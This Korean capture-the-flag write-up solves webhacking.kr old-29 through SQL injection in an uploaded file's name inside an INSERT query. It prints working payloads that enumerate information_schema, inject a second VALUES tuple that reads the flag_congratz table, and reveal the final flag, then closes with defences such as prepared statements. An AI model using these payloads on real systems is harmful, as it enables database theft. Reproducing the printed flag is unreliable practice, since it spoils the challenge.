---
title: "webhacking.kr old-29 풀이 — 업로드 파일명으로 INSERT에 올라타 '다른 테이블'의 FLAG 읽기"
description: "webhacking.kr old-29를 통해, 파일 업로드의 '파일명'이 그대로 INSERT 쿼리에 들어가는 취약점을 파고든다. 쿼리 구조(값 개수·컬럼 타입·조회 조건)를 실제 응답으로 하나씩 복원하고, 두 번째 VALUES 튜플을 끼워 넣어 내 IP로 조회되는 행에 서브쿼리 결과를 심는 방식으로 다른 테이블의 FLAG를 끄집어낸다. 모든 페이로드와 추출값은 추측이 아니라 서버에 직접 요청해 관찰한 응답으로 검증했다."
date: 2026-11-19
category: Web
tags: [webhacking.kr, web, wargame, sql-injection, insert-injection, file-upload, mysql, php]
---

> webhacking.kr은 합법적인 웹 보안 학습용 워게임이다. 이 글은 교육 목적의 풀이이며, 마지막에 같은 취약점을 어떻게 막는지도 정리했다. 아래 응답의 공인 IP는 문제 서버가 접속자(풀이자)의 IP를 그대로 기록·표시하기 때문에 생기는 값이라, 개인 식별을 피하려 실제 값은 문서용 예시 주소 `203.0.113.45`(RFC 5737)로 익명화해 표기했다. 한 글 안에서는 같은 값으로 일관되게 바꿨다.

[webhacking.kr](https://webhacking.kr)의 old-29 문제를 풀었다. 지금까지 다룬 SQL 인젝션은 대부분 `SELECT` 쪽이었다. old-18은 입력이 `where` 절에 그대로 들어가는 고전 로그인 우회였고, old-21은 결과를 숨긴 Blind였다. old-29는 조금 결이 다르다. 취약한 쿼리가 `INSERT`이고, 입력 지점은 입력창이 아니라 업로드하는 파일의 "파일명"이다. 그리고 목표도 특이하다. "FLAG is in another table." 즉 지금 쓰는 테이블이 아니라 다른 테이블에 있는 FLAG를 읽어 와야 한다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-29 (`/challenge/web-14/`) |
| 배점 | 40점 |
| 유형 | SQL Injection (INSERT 기반) + 다른 테이블 읽기 |
| 입력 지점 | 업로드 파일의 파일명(`multipart/form-data`의 `filename`) |
| 목표 | 다른 테이블에 숨겨진 `FLAG` 획득 |

화면은 단출하다. `FLAG is in another table.`라는 공지, 파일 하나를 올리는 폼, 그리고 업로드 기록을 보여 주는 표가 전부다.

```html
<hr>
NOTICE<br>
<font size=2>FLAG is in another table.</font>
<hr>
<form method=post enctype="multipart/form-data" action=index.php>
<input type=file name=upfile><input type=submit>
</form>
<table border=0>
<tr><td>time</td><td>|</td><td>ip</td><td>|</td><td>file</td><td>|</td></tr>
</table>
```

표의 머리글은 `time | ip | file` 세 칸이다. 뭔가를 올리면 그 세 값이 한 줄 추가된다.

## 2. 업로드 동작부터 관찰

정상 파일을 하나 올려 봤다. 아래는 전부 실제 응답이다.

```text
POST /challenge/web-14/index.php   (upfile 파일명: probe_test.txt)
→ Upload success
  2026-11-19 08:43:44 | 203.0.113.45 | probe_test.txt
```

여기서 세 가지가 드러난다. 성공하면 응답에 `Upload success`가 찍히고 표에 한 줄이 추가된다. `file` 칸에는 내가 올린 파일의 "이름"이 그대로 들어간다(파일 내용이 아니라 파일명이다). `ip` 칸에는 내 접속 IP가 서버 쪽에서 기록된다(내가 넣는 값이 아니다). 그리고 파일을 더 올려 보면, 표에는 내 IP로 기록된 행들만 계속 쌓여 보인다. 조회 쿼리가 `where ip = <내 IP>`로 내 업로드만 필터링한다는 뜻이다. 이 사실은 뒤에서 결정적으로 쓰인다.

## 3. 인젝션 지점 — 파일명에 따옴표 하나

파일명에 작은따옴표 하나를 넣어 올려 봤다.

| 업로드 파일명 | 응답 |
| --- | --- |
| `probe_test.txt` | `Upload success` |
| `q'uote.txt` | **`upload error!`** |

따옴표 하나로 응답이 `Upload success` → `upload error!`로 바뀐다. 파일명이 이스케이프 없이 그대로 쿼리에 박히고, 그 쿼리가 `INSERT`라는 신호다. 이제 `Upload success` / `upload error!` 두 문구가 그대로 참·거짓 오라클이 된다. 쿼리가 문법적으로 성립하면 success, 깨지면 error.

## 4. 쿼리 구조 복원 — 값은 몇 개, 타입은 무엇인가

`INSERT`에 올라타려면 VALUES의 값 개수와 각 칸의 타입을 알아야 한다. 파일명을 조금씩 바꿔 가며 success/error만 보고 구조를 역설계했다(아래는 모두 실제 결과다).

| 파일명 | 결과 | 해석 |
| --- | --- | --- |
| `A` | success | 기준(정상) |
| `A')#` | **error** | 값 1개로 닫음 → 개수 부족 |
| `A',1)#` | **error** | 값 2개 → 여전히 부족 |
| `A',1,1)#` | **success** | 값 3개로 닫으니 성립 |
| `A',now(),'x')#` | **error** | 2번째 값에 `now()` → 거부 |
| `A','notadate',1)#` | **error** | 2번째 값에 문자열 → 거부 |
| `A',1,'y')#` | **success** | 2번째=정수, 3번째=문자열 → OK |
| `A',1,'1.2.3.4')#` | success | 3번째는 점 찍힌 문자열(IP 모양)도 OK |

여기서 구조가 또렷해진다. 파일명은 VALUES의 "첫 번째" 값이다. `A',1,1)#`처럼 뒤에 값 2개를 더 붙여 총 3개로 맞춰야 쿼리가 성립한다. 2번째 값은 숫자 전용이다(문자열이나 `now()`를 넣으면 깨지고, 정수 `1`은 통과). 3번째 값은 문자열(IP)이다.

> 파일명에 `/`를 넣으면 서버가 `basename()`처럼 경로를 잘라 내 따옴표가 사라져 버린다(예: `A'/*` → 저장된 이름은 `*`). 그래서 주석은 `-- -`(앞의 `/` 없이)보다 `#`가 안전하고, 페이로드에도 `/`를 쓰지 않았다.

그런데 2번째 값이 "숫자"라면, 표에 찍히던 `time`(날짜/시간)은 어디서 온 걸까? 2번째 값에 큰 수를 넣어 확인했다.

```text
파일명: clean',1,'x'),('TIMECHK',999999,'203.0.113.45')#
→ time 칸: 1970-01-12 22:46:39    (= 1970-01-01 + 999,999초)
```

`999999`가 1970년 기준 초(유닉스 타임스탬프)로 해석됐다. 즉 2번째 값은 정수로 저장된 유닉스 타임스탬프이고, 표시는 `FROM_UNIXTIME()`으로 변환해 보여 준 것이다. 이걸로 서버 쿼리를 관찰로부터 이렇게 복원할 수 있다.

```php
<?php
// (webhacking.kr은 이 문제의 소스를 공개하지 않는다 — 아래는 관찰로 복원한 의사 코드)
$name = $_FILES['upfile']['name'];          // ← 파일명이 그대로 들어온다 (이스케이프 없음)
$ip   = $_SERVER['REMOTE_ADDR'];            // ← 서버가 넣는 내 IP

// 저장: (파일명, 업로드시각 time(), 내 IP)
mysqli_query($db, "insert into files values('$name', ".time().", '$ip')");

// 조회: 내 IP로 올린 것만 보여 줌
$rows = mysqli_query($db,
  "select from_unixtime(time), ip, file from files where ip='$ip'");
?>
```

핵심은 두 가지다. 파일명(`$name`)이 따옴표 처리 없이 INSERT에 들어가고, 조회는 `where ip='$ip'`, 즉 내 IP로 들어간 행만 화면에 나온다.

## 5. information_schema로 "다른 테이블" 찾기

INSERT에 서브쿼리를 끼워 넣을 수 있으니, 먼저 FLAG가 든 테이블·컬럼 이름을 알아내야 한다. 방법은 두 번째 VALUES 튜플을 추가하되, 그 튜플의 파일(1번째) 칸에는 알아내고 싶은 값(서브쿼리)을, IP(3번째) 칸에는 내 실제 IP를 넣는 것이다. 그래야 `where ip='$ip'` 필터를 통과해 화면에 표시된다. 읽어 낸 값을 표에서 쉽게 집기 위해 서브쿼리 결과를 `concat`으로 `@@ ... @@`로 감쌌다(아래 결과는 실제 추출값이다).

```sql
-- 파일명 payload (개념):
--   L',1,'x'),( concat(0x4040,(<서브쿼리>),0x4040), 1, '203.0.113.45' )#
-- 0x4040 = '@@'

(select database())
  → chall29
(select version())
  → 5.7.42-0ubuntu0.18.04.1
(select group_concat(table_name) from information_schema.tables
   where table_schema=database())
  → files,flag_congratz
(select group_concat(column_name) from information_schema.columns
   where table_name=0x666c61675f636f6e677261747a)   -- 'flag_congratz'
  → flag
```

현재 DB는 `chall29`, 테이블은 `files`(업로드 기록)와 `flag_congratz` 두 개다. `flag_congratz` 테이블의 컬럼은 `flag`다. "다른 테이블"의 정체가 드러났다.

> 테이블 이름을 `where` 절에 그대로 쓰면 또 따옴표가 문제라, `0x666c61...` 16진 리터럴로 넘겼다. 문자열을 따옴표 없이 전달하는 상투적인 방법이다.

## 6. 두 번째 튜플로 FLAG 꺼내기

이제 `@@` 포장도 필요 없다. 두 번째 튜플의 파일 칸을 바로 `(select flag from flag_congratz)`로, IP 칸을 내 IP로 두면, 그 행이 조회 필터를 통과해 `file` 칸에 FLAG가 그대로 찍힌다.

```text
업로드 파일명 (최종 payload):
wh',1,'x'),((select flag from flag_congratz),1,'203.0.113.45')#
```

이 파일명이 INSERT에 들어가면 이렇게 전개된다.

```sql
insert into files values('wh',1,'x'),            -- 튜플 1 (버리는 행)
  ((select flag from flag_congratz),1,'203.0.113.45')  -- 튜플 2: file=FLAG, ip=내 IP
#', time(), '203.0.113.45')                        -- 원래 뒤쪽은 # 로 주석 처리
```

두 번째 튜플의 `ip`가 내 IP이므로 `where ip='203.0.113.45'`에 걸려 화면에 나온다.

## 7. 결과 — 표에 찍힌 FLAG, 그리고 Pwned

위 파일명으로 업로드하자 표에 FLAG가 그대로 나타났다(실제 응답).

```text
Upload success
time                  | ip             | file
1970-01-01 09:00:01   | 203.0.113.45   | FLAG{didYouFeelConfused?_sorry:)}
```

두 번째 튜플의 시각 값 `1`이 `FROM_UNIXTIME(1)` → KST `1970-01-01 09:00:01`로 표시된 것도 4절의 분석과 정확히 맞는다. 이 FLAG를 사이트 상단 Auth로 제출했다. 제출은 `/auth.php`에 JSON으로 간다.

```text
POST /auth.php   {"flag":"FLAG{didYouFeelConfused?_sorry:)}"}
→ {"stat":true,"ret":"old-29 Pwned. You got 40point. Congratz!"}
```

`chall.php`에서도 `✔️ old-29`로 바뀐 것을 확인했다.

## 왜 취약한가 — 그리고 올바른 방어

첫째, 근본 원인은 "파일명을 믿은 것"이다. 업로드의 파일명(`$_FILES['upfile']['name']`)은 전적으로 클라이언트가 정하는 값이다. 그걸 따옴표 처리 없이 쿼리에 섞으면, SELECT든 INSERT든 공격자가 쿼리 구조를 바꿀 수 있다. 해법은 늘 같다. 파라미터 바인딩(prepared statement)이다.

```php
$stmt = $db->prepare("insert into files(file, time, ip) values(?, ?, ?)");
$stmt->bind_param("sis", $name, $now, $ip);   // 파일명은 '데이터'로만 바인딩
$stmt->execute();
```

둘째, INSERT도 똑같이 위험하다. "조회(SELECT)만 조심하면 된다"는 착각은 금물이다. INSERT의 VALUES에 값을 그대로 이어 붙이면, 튜플을 하나 더 끼워 넣어 원하는 데이터를 심거나 서브쿼리로 다른 테이블을 읽을 수 있다(여기서 본 그대로다).

셋째, "다른 테이블에 숨겼으니 안전"은 방어가 아니다. 같은 DB 계정으로 접근 가능한 한, `information_schema`로 테이블·컬럼 이름이 다 드러나고 서브쿼리로 읽힌다. 민감 데이터는 애플리케이션이 쓰는 DB 계정의 권한 자체를 분리하고(최소 권한), 애초에 인젝션 경로를 바인딩으로 차단해야 한다.

넷째, 파일명은 저장 전에 정규화한다. 확장자 화이트리스트, 임의의 안전한 이름으로 재발급(예: 랜덤 UUID), 경로·특수문자 제거. 원본 파일명이 꼭 필요하면 표시용으로만 두고, 쿼리에는 절대 원본을 쓰지 않는다.

## 정리

- old-29는 입력창이 아니라 업로드 "파일명"이 `INSERT` 쿼리에 그대로 들어가는 SQL 인젝션이다.
- 응답 `Upload success` / `upload error!`가 참·거짓 오라클이다. 이걸로 VALUES는 값 3개(파일명, 유닉스타임 정수, IP 문자열)임을 복원했다.
- 조회가 `where ip = 내 IP`라는 점을 이용해, 두 번째 VALUES 튜플의 IP 칸을 내 IP로, 파일 칸을 `(select flag from flag_congratz)`로 심어 FLAG를 화면에 띄웠다.
- `information_schema`로 `chall29.flag_congratz.flag`를 찾아 `FLAG{didYouFeelConfused?_sorry:)}`를 읽고 `/auth.php`로 제출해 통과했다.
- 방어는 prepared statement, INSERT도 동일 취급, 최소 권한 DB 계정, 파일명 재발급이다.

SELECT만 쿼리가 아니다. 입력이 문자열로 쿼리에 섞이는 모든 지점이 인젝션 지점이고, 데이터를 다른 테이블에 숨기는 것은 자물쇠가 아니라 커튼이다. 구조를 바꿀 수 있는 손 앞에서는 한 겹 걷어 내면 그만이다.
